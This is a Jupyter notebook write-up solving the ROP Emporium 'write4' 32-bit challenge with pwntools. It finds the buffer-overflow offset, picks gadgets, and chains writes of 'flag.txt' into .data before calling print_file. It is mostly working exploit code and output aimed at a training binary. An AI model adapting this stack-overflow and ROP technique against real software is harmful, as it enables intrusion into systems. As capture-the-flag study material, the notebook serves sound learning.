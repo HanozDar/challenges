{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "bff0d9f3",
   "metadata": {},
   "source": [
    "# Solution for Write 4 ROP Emporium using pwntools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ac8a5d77",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pwn \n",
    "from pwn import *"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "001fb231",
   "metadata": {},
   "source": [
    "Lets analyse the binary first\n",
    "See what we're dealing with\n",
    "```text\n",
    "┌──(hanoz㉿kali)-[~/Desktop/ropemporium/write4/write432]\n",
    "└─ file write432 \n",
    "write432: ELF 32-bit LSB executable, \n",
    "```\n",
    "Next let's check the options on the binary\n",
    "```text\n",
    "gdb-peda checksec\n",
    "CANARY    : disabled\n",
    "FORTIFY   : disabled\n",
    "NX        : ENABLED\n",
    "PIE       : disabled\n",
    "RELRO     : Partial\n",
    "```\n",
    "We can see that NX is enabled. So we can't inject shellcode on the stack.\n",
    "Now let's see what functions are there and let's try to understand how everything works\n",
    "```text\n",
    "0x08048506  main\n",
    "0x0804852a  usefulFunction\n",
    "0x08048543  usefulGadgets\n",
    "0x080483b0  pwnme@plt\n",
    "```\n",
    "Okie then \n",
    "main is calling pwnme.\n",
    "The pwnme function and the print_file function are not showing up in our ghidra because they are not in the same binary, we are linking it in runtime to a libwrite432.so file, which sort of acts like how libc does.\n",
    "\n",
    "Okay so the pwnme function takes a buffer of size 36 and at this point the buffer overflow is easy\n",
    "Now let's just get the offset and see what to do."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "5c44cafb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './write432'\n",
      "[+] Starting local process './write432': pid 23659\n",
      "[*] '/home/hanoz/Desktop/ropemporium/write4/write432/write432'\n",
      "    Arch:     i386-32-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    No canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      No PIE (0x8048000)\n",
      "    RUNPATH:  b'.'\n",
      "[*] Loaded 10 cached gadgets for './write432'\n"
     ]
    }
   ],
   "source": [
    "p = process('./write432')\n",
    "elf = ELF('./write432')\n",
    "rop = ROP(elf)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2db48b53",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'write4 by ROP Emporium\\nx86\\n\\nGo ahead and give me the input already!\\n\\n> '\n"
     ]
    }
   ],
   "source": [
    "init_recvd = p.recv()\n",
    "print(init_recvd)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9c2e4fe1",
   "metadata": {},
   "source": [
    "Alright so \n",
    "The usefulGadgets function has a mov [edi],ebp It moves the value of ebp into the address contained by EDI\n",
    "So now if we can pop edi; pop ebp and then write the address of the area we want to write, and then write the string, we can theoretically write directly to memory. \n",
    "First we need to decide which section of memory we want to write to\n",
    "We use radare2 for that\n",
    "```text\n",
    "[0x080484d0]> iS\n",
    "[Sections]\n",
    "\n",
    "nth paddr        size vaddr       vsize perm name\n",
    "―――――――――――――――――――――――――――――――――――――――――――――――――\n",
    "0   0x00000000    0x0 0x00000000    0x0 ---- \n",
    "1   0x00000154   0x13 0x08048154   0x13 -r-- .interp\n",
    "2   0x00000168   0x20 0x08048168   0x20 -r-- .note.ABI-tag\n",
    "3   0x00000188   0x24 0x08048188   0x24 -r-- .note.gnu.build-id\n",
    "4   0x000001ac   0x3c 0x080481ac   0x3c -r-- .gnu.hash\n",
    "5   0x000001e8   0xb0 0x080481e8   0xb0 -r-- .dynsym\n",
    "6   0x00000298   0x8b 0x08048298   0x8b -r-- .dynstr\n",
    "7   0x00000324   0x16 0x08048324   0x16 -r-- .gnu.version\n",
    "8   0x0000033c   0x20 0x0804833c   0x20 -r-- .gnu.version_r\n",
    "9   0x0000035c    0x8 0x0804835c    0x8 -r-- .rel.dyn\n",
    "10  0x00000364   0x18 0x08048364   0x18 -r-- .rel.plt\n",
    "11  0x0000037c   0x23 0x0804837c   0x23 -r-x .init\n",
    "12  0x000003a0   0x40 0x080483a0   0x40 -r-x .plt\n",
    "13  0x000003e0    0x8 0x080483e0    0x8 -r-x .plt.got\n",
    "14  0x000003f0  0x1c2 0x080483f0  0x1c2 -r-x .text\n",
    "15  0x000005b4   0x14 0x080485b4   0x14 -r-x .fini\n",
    "16  0x000005c8   0x14 0x080485c8   0x14 -r-- .rodata\n",
    "17  0x000005dc   0x44 0x080485dc   0x44 -r-- .eh_frame_hdr\n",
    "18  0x00000620  0x114 0x08048620  0x114 -r-- .eh_frame\n",
    "19  0x00000efc    0x4 0x08049efc    0x4 -rw- .init_array\n",
    "20  0x00000f00    0x4 0x08049f00    0x4 -rw- .fini_array\n",
    "21  0x00000f04   0xf8 0x08049f04   0xf8 -rw- .dynamic\n",
    "22  0x00000ffc    0x4 0x08049ffc    0x4 -rw- .got\n",
    "23  0x00001000   0x18 0x0804a000   0x18 -rw- .got.plt\n",
    "24  0x00001018    0x8 0x0804a018    0x8 -rw- .data\n",
    "25  0x00001020    0x0 0x0804a020    0x4 -rw- .bss\n",
    "26  0x00001020   0x29 0x00000000   0x29 ---- .comment\n",
    "27  0x0000104c  0x440 0x00000000  0x440 ---- .symtab\n",
    "28  0x0000148c  0x211 0x00000000  0x211 ---- .strtab\n",
    "29  0x0000169d  0x105 0x00000000  0x105 ---- .shstrtab\n",
    "```\n",
    "Okay we can see there are 8 bytes free in data. We can write in that and we can get the address also for that if we were doing it manually.\n",
    "Then we need to find the gadgets. Let's try and use pwntools for that "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "cc39871e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{134513542: Gadget(0x8048386, ['ret'], [], 0x4),\n",
      " 134513562: Gadget(0x804839a, ['add esp, 8', 'pop ebx', 'ret'], ['ebx'], 0x10),\n",
      " 134513565: Gadget(0x804839d, ['pop ebx', 'ret'], ['ebx'], 0x8),\n",
      " 134513778: Gadget(0x8048472, ['add esp, 0x10', 'leave', 'ret'], ['ebp', 'esp'], 0x2540be413),\n",
      " 134513781: Gadget(0x8048475, ['leave', 'ret'], ['ebp', 'esp'], 0x2540be403),\n",
      " 134514085: Gadget(0x80485a5, ['add esp, 0xc', 'pop ebx', 'pop esi', 'pop edi', 'pop ebp', 'ret'], ['ebx', 'esi', 'edi', 'ebp'], 0x20),\n",
      " 134514088: Gadget(0x80485a8, ['pop ebx', 'pop esi', 'pop edi', 'pop ebp', 'ret'], ['ebx', 'esi', 'edi', 'ebp'], 0x14),\n",
      " 134514089: Gadget(0x80485a9, ['pop esi', 'pop edi', 'pop ebp', 'ret'], ['esi', 'edi', 'ebp'], 0x10),\n",
      " 134514090: Gadget(0x80485aa, ['pop edi', 'pop ebp', 'ret'], ['edi', 'ebp'], 0xc),\n",
      " 134514091: Gadget(0x80485ab, ['pop ebp', 'ret'], ['ebp'], 0x8)}\n"
     ]
    }
   ],
   "source": [
    "pprint(rop.gadgets)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c6341d25",
   "metadata": {},
   "source": [
    "Since our instruction above only moves from edi to ebp, we can safely think of using 0x80485aa <- This gadget\n",
    "It does exactly what we need it to. We then need to append the data address and then we need to append the 4 byte string. repeat that again for another 4 bytes. First let's get the address of the data section using pwntools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "66a2a004",
   "metadata": {},
   "outputs": [],
   "source": [
    "movtomem_operation_addr = elf.symbols['usefulGadgets'] #THIS IS AN ADDRESS BTW\n",
    "pop_operation_rop = rop.find_gadget([\"pop edi\", \"pop ebp\", \"ret\"])[0]\n",
    "data_loc_addr = elf.symbols.data_start\n",
    "#print(hex(data_loc_addr))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4bdbb75",
   "metadata": {},
   "source": [
    "## NOW Let's make the ROP Chain"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "58e09eb6",
   "metadata": {},
   "outputs": [],
   "source": [
    "rop.raw([pop_operation_rop, data_loc_addr , b'flag', movtomem_operation_addr]) #AS WE ARE ONLY WRITING 4 BYTES\n",
    "rop.raw([pop_operation_rop,data_loc_addr+0x4, b'.txt',movtomem_operation_addr])\n",
    "rop.print_file(data_loc_addr)\n",
    "rop_chain = rop.chain()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2785ce10",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "7090cc35",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Process './write432' stopped with exit code -11 (SIGSEGV) (pid 19432)\n",
      "[x] Parsing corefile...\n",
      "[*] '/home/hanoz/Desktop/ropemporium/write4/write432/core.19432'\n",
      "    Arch:      i386-32-little\n",
      "    EIP:       0x6161616c\n",
      "    ESP:       0xffdd7760\n",
      "    Exe:       '/home/hanoz/Desktop/ropemporium/write4/write432/write432' (0x8048000)\n",
      "    Fault:     0x6161616c\n",
      "[+] Parsing corefile...: Done\n",
      "[+] We have found the offset at location 44\n"
     ]
    }
   ],
   "source": [
    "x = 50\n",
    "payload = cyclic(x,n=4) \n",
    "p.sendline(payload)\n",
    "\n",
    "p.wait()\n",
    "core = p.corefile\n",
    "\n",
    "offset = cyclic_find(core.fault_addr)\n",
    "log.success(\"We have found the offset at location \" + str(offset))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "bb76a33a",
   "metadata": {},
   "outputs": [],
   "source": [
    "buffer = b\"A\"*44\n",
    "payload = buffer + rop_chain\n",
    "p.sendline(payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "cbcafdde",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Process './write432' stopped with exit code -11 (SIGSEGV) (pid 23659)\n",
      "b'Thank you!\\nROPE{a_placeholder_32byte_flag!}'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_23645/1883862293.py:1: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n",
      "  res = p.recvuntil(\"}\")\n"
     ]
    }
   ],
   "source": [
    "res = p.recvuntil(\"}\")\n",
    "print(res)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d2666f7",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
